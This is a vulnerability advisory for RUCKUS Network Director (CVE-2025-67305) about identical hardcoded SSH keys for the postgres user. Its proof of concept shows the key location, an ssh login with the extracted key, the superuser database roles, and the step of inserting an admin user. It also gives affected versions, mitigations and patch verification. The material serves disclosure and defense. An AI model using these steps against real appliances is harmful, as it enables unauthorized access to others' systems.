# RUCKUS Network Director: Hardcoded SSH Keys for the postgres User

- **Advisory ID:** MCSAID-2025-012
- **CVE ID:** CVE-2025-67305
- **Product:** RUCKUS Network Director (https://support.ruckuswireless.com/products/156-ruckus-network-director-rnd#f-product-facet=RND)
- **Reported:** 2025-09-24
- **Published:** 2025-10-31
- **Severity:** High (8.8)
- **CWE:** [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- **Discovered by:** Ivan Racic of Marlink Cyber

---

## Summary

The RUCKUS Network Director OVA appliance contains hardcoded SSH keys for the `postgres` user. These keys are identical across all deployments, allowing an attacker with network access to authenticate via SSH without a password. Once authenticated, the attacker can access the PostgreSQL database with superuser privileges, create administrative users for the web interface, and potentially escalate privileges further.

---

## Affected Versions

| Version                                       | Status                    |
| --------------------------------------------- | ------------------------- |
| RUCKUS Network Director < 4.5.0.56            | Vulnerable                |
| RUCKUS Network Director 4.5.0.56              | Patched                   |

---

## Proof of Concept

The hardcoded SSH keys are located at `/data/var/lib/pgsql/.ssh/` on the appliance:

```
bash-4.2$ ls -la /data/var/lib/pgsql/.ssh/
total 12
drwxr-xr-x. 2 postgres postgres   75 Aug  5 03:18 .
drwx------. 7 postgres postgres  166 Sep 23 19:07 ..
-rw-------. 1 postgres postgres  553 Aug  5 03:18 authorized_keys
-r--------. 1 postgres postgres 2622 Aug  5 02:59 id_rsa_pgpool
-rw-r--r--. 1 postgres postgres  553 Aug  5 02:59 id_rsa_pgpool.pub
```

The keys are consistent across all vulnerable deployments:

```
bash-4.2$ sha256sum id_rsa_pgpool*
24890808bc8c1715ec4146645d697464d48661333e19a93d516d69788534fcd6  id_rsa_pgpool
2b4fb15d13d50984e074f81f400fe2c06c40912e3feebadcbbeb485e50388db4  id_rsa_pgpool.pub
```

Using the extracted private key, an attacker can authenticate to any vulnerable appliance:

```
$ ssh postgres@<target> -i ./id_rsa_pgpool
Last login: Wed Sep 24 07:27:39 2025 from <attacker_ip>
-bash-4.2$ id
uid=26(postgres) gid=26(postgres) groups=26(postgres)
-bash-4.2$ hostname
ruckus
```

The `postgres` user has database superuser privileges:

```
ruckus=# \du
                                   List of roles
 Role name |                         Attributes                         | Member of
-----------+------------------------------------------------------------+-----------
 pgpool    | Superuser, Create role, Create DB                          | {}
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
 repl      | Replication                                                | {}
 ruckus    | Superuser, Create role, Create DB                          | {}
```

An attacker can insert a new administrative user into the `users` table to gain access to the web admin panel on TCP port 8443.

The hardcoded key was explicitly noted in the appliance's kickstart configuration:

```
[root@ruckus ~]# grep "TODO should not hard-code SSH key" original-ks.cfg -A2
# TODO should not hard-code SSH key
sshkey --username=postgres "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB..."
```

---

## Impact

An attacker with network access to the SSH service can authenticate as the `postgres` user without credentials. While this account does not have root or sudo privileges, the attacker gains:

- Full access to the PostgreSQL database with superuser privileges
- Ability to create administrative users for the web interface (TCP 8443)
- Read/write access to application data
- Remote operating system access
- Potential for further privilege escalation depending on system configuration

---

## Mitigations

* Update to RUCKUS Network Director version 4.5.0.56 or later.
* Restrict network access to SSH (TCP 22) and the admin interface (TCP 8443).
* Audit existing deployments for unauthorized database users.

---

## Patch Verification

In version 4.5.0.56, the hardcoded SSH keys have been removed. SSH keys are now generated dynamically during installation, and each deployment has unique keys:

```
[root@ruckus ~]# grep "TODO should not hard-code SSH key" original-ks.cfg -A5
# TODO should not hard-code SSH key
# PostgreSQL SSH keys will be generated dynamically during installation
# No hardcoded SSH keys for security reasons
```

---

## References

* Vendor Advisory: [RUCKUS Network Director: Critical Security Bypass Vulnerability Leading to
Remote Code Execution and shell Access](https://webresources.commscope.com/download/assets/RUCKUS+Network+Director%3A+Critical+Security+Bypass+Vulnerability+Leading+to+Remote+Code+Execution+and/3adeb3acb69211f08a46b6532db37357)
